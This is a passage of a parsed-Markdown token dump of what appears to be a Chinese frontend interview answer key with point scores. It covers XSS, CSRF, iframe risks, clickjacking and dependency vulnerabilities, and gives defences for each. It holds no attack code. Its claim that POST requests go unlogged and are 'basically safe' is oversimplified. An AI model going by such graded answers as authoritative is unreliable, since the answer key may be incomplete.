类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】\\n- **:2** 防御：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】\\n","task":false,"loose":false,"text":"**:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】","tokens":[{"type":"text","raw":"**:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】","text":"**:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】","text":" XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】","escaped":false}]}]},{"type":"list_item","raw":"- **:2** 防御：","task":false,"loose":false,"text":"**:2** 防御：","tokens":[{"type":"text","raw":"**:2** 防御：","text":"**:2** 防御：","tokens":[{"type":"strong","raw":"**:2**","text":":2","tokens":[{"type":"text","raw":":2","text":":2","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。  \\n >2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。","tokens":[{"type":"paragraph","raw":"1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。  \\n2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。","text":"1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。  \\n2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。","tokens":[{"type":"text","raw":"1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。","text":"1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。","text":"2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。","escaped":false}]}],"text":"1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。  \\n2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## CSRF 攻击\\n\\n","depth":2,"text":"CSRF 攻击","tokens":[{"type":"text","raw":"CSRF 攻击","text":"CSRF 攻击","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。\\n- **:4** 防御：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。\\n","task":false,"loose":false,"text":"**:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。","tokens":[{"type":"text","raw":"**:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。","text":"**:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。","text":" CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。","escaped":false}]}]},{"type":"list_item","raw":"- **:4** 防御：","task":false,"loose":false,"text":"**:4** 防御：","tokens":[{"type":"text","raw":"**:4** 防御：","text":"**:4** 防御：","tokens":[{"type":"strong","raw":"**:4**","text":":4","tokens":[{"type":"text","raw":":4","text":":4","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >1、验证 HTTP 的 Referer 字段。  \\n >2、在请求地址中添加 token 并验证。  \\n >3、在 HTTP 头中自定义属性并验证。  \\n >4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  \\n >>get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","tokens":[{"type":"paragraph","raw":"1、验证 HTTP 的 Referer 字段。  \\n2、在请求地址中添加 token 并验证。  \\n3、在 HTTP 头中自定义属性并验证。  \\n4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  \\n","text":"1、验证 HTTP 的 Referer 字段。  \\n2、在请求地址中添加 token 并验证。  \\n3、在 HTTP 头中自定义属性并验证。  \\n4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  ","tokens":[{"type":"text","raw":"1、验证 HTTP 的 Referer 字段。","text":"1、验证 HTTP 的 Referer 字段。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"2、在请求地址中添加 token 并验证。","text":"2、在请求地址中添加 token 并验证。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"3、在 HTTP 头中自定义属性并验证。","text":"3、在 HTTP 头中自定义属性并验证。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  ","text":"4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  ","escaped":false}]},{"type":"blockquote","raw":">get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","tokens":[{"type":"paragraph","raw":"get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","text":"get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","tokens":[{"type":"text","raw":"get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","text":"get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","escaped":false}]}],"text":"get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。"}],"text":"1、验证 HTTP 的 Referer 字段。  \\n2、在请求地址中添加 token 并验证。  \\n3、在 HTTP 头中自定义属性并验证。  \\n4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  \\n>get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## iframe 风险\\n\\n","depth":2,"text":"iframe 风险","tokens":[{"type":"text","raw":"iframe 风险","text":"iframe 风险","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。\\n- **:1** 防御：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。\\n","task":false,"loose":false,"text":"**:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。","tokens":[{"type":"text","raw":"**:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。","text":"**:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。","text":" 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。","escaped":false}]}]},{"type":"list_item","raw":"- **:1** 防御：","task":false,"loose":false,"text":"**:1** 防御：","tokens":[{"type":"text","raw":"**:1** 防御：","text":"**:1** 防御：","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  ","tokens":[{"type":"paragraph","raw":"iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  ","text":"iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  ","tokens":[{"type":"text","raw":"iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  ","text":"iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  ","escaped":false}]}],"text":"iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  "},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 点击劫持\\n\\n","depth":2,"text":"点击劫持","tokens":[{"type":"text","raw":"点击劫持","text":"点击劫持","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。\\n- **:2** 通常的攻击步骤是这样的：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。\\n","task":false,"loose":false,"text":"**:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。","tokens":[{"type":"text","raw":"**:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。","text":"**:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。","text":" 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。","escaped":false}]}]},{"type":"list_item","raw":"- **:2** 通常的攻击步骤是这样的：","task":false,"loose":false,"text":"**:2** 通常的攻击步骤是这样的：","tokens":[{"type":"text","raw":"**:2** 通常的攻击步骤是这样的：","text":"**:2** 通常的攻击步骤是这样的：","tokens":[{"type":"strong","raw":"**:2**","text":":2","tokens":[{"type":"text","raw":":2","text":":2","escaped":false}]},{"type":"text","raw":" 通常的攻击步骤是这样的：","text":" 通常的攻击步骤是这样的：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。  \\n >2、将我们的页面放入到 iframe 当中。  \\n >3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。  \\n >4、把 iframe 设置为100%透明度。  \\n >5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。","tokens":[{"type":"paragraph","raw":"1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。  \\n2、将我们的页面放入到 iframe 当中。  \\n3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。  \\n4、把 iframe 设置为100%透明度。  \\n5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。","text":"1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。  \\n2、将我们的页面放入到 iframe 当中。  \\n3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。  \\n4、把 iframe 设置为100%透明度。  \\n5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。","tokens":[{"type":"text","raw":"1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。","text":"1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"2、将我们的页面放入到 iframe 当中。","text":"2、将我们的页面放入到 iframe 当中。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。","text":"3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"4、把 iframe 设置为100%透明度。","text":"4、把 iframe 设置为100%透明度。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。","text":"5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。","escaped":false}]}],"text":"1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。  \\n2、将我们的页面放入到 iframe 当中。  \\n3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。  \\n4、把 iframe 设置为100%透明度。  \\n5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **:1** 危害：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** 危害：","task":false,"loose":false,"text":"**:1** 危害：","tokens":[{"type":"text","raw":"**:1** 危害：","text":"**:1** 危害：","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 危害：","text":" 危害：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。","tokens":[{"type":"paragraph","raw":"攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。","text":"攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。","tokens":[{"type":"text","raw":"攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。","text":"攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。","escaped":false}]}],"text":"攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **:2** 防御：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:2** 防御：","task":false,"loose":false,"text":"**:2** 防御：","tokens":[{"type":"text","raw":"**:2** 防御：","text":"**:2** 防御：","tokens":[{"type":"strong","raw":"**:2**","text":":2","tokens":[{"type":"text","raw":":2","text":":2","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":" >1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n >2、判断当前页面是否被嵌入到 iframe 中。","tokens":[{"type":"paragraph","raw":"1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。","text":"1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。","tokens":[{"type":"text","raw":"1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。","text":"1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。","escaped":false}]}],"text":"1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 第三方依赖包带来的问题\\n\\n","depth":2,"text":"第三方依赖包带来的问题","tokens":[{"type":"text","raw":"第三方依赖包带来的问题","text":"第三方依赖包带来的问题","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。\\n\\n- **:1** 防御：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。\\n\\n","task":false,"loose":true,"text":"**:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。\\n","tokens":[{"type":"text","raw":"**:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。\\n","text":"**:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。","text":" 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。","escaped":false}]}]},{"type":"list_item","raw":"- **:1** 防御：","task":false,"loose":true,"text":"**:1** 防御：","tokens":[{"type":"text","raw":"**:1** 防御：","text":"**:1** 防御：","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >使用 NSP(Node Security Platform)、Snyk 等等这类工具。","tokens":[{"type":"paragraph","raw":"使用 NSP(Node Security Platform)、Snyk 等等这类工具。","text":"使用 NSP(Node Security Platform)、Snyk 等等这类工具。","tokens":[{"type":"text","raw":"使用 NSP(Node Security Platform)、Snyk 等等这类工具。","text":"使用 NSP(Node Security Platform)、Snyk 等等这类工具。","escaped":false}]}],"text":"使用 NSP(Node Security Platform)、Snyk 等等这类工具。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## https 存在的风险\\n\\n","depth":2,"text":"https 存在的风险","tokens":[{"type":"text","raw":"https 存在的风险","text":"https 存在的风险","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 